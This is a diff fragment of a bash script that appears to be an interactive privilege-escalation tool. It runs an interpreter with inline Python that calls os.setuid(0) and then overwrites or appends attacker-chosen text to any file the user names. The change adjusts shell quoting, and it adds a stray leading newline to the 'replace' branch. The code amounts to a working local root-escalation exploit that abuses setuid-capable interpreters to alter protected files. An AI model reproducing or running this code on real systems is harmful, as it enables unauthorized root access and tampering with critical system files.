@@ -332,7 +332,7 @@ while true; do
 
                                         "Fully replace the file")
                                             read -p "What do you want to write into this file ? : " REPLACEFILE
-                                            "$choice" -c 'import os; os.setuid(0);open("'$FILE'","w+").write("'$REPLACEFILE'")'
+                                            "$choice" -c 'import os; os.setuid(0);open("'$FILE'","w+").write("\n'"$REPLACEFILE"'")'
 
                                             echo "contents of the file after modification : "
                                             echo " "
@@ -344,7 +344,7 @@ while true; do
                             
                                         "Append data to the file")
                                             read -p "What do you want to append this file ? : " APPENDFILE
-                                            "$choice" -c 'import os; os.setuid(0);open("'$FILE'","a").write("\n'$APPENDFILE'")'
+                                            "$choice" -c 'import os; os.setuid(0);open("'$FILE'","a").write("\n'"$APPENDFILE"'")'
 
                                             echo "contents of the file after modification : "
                                             echo " "
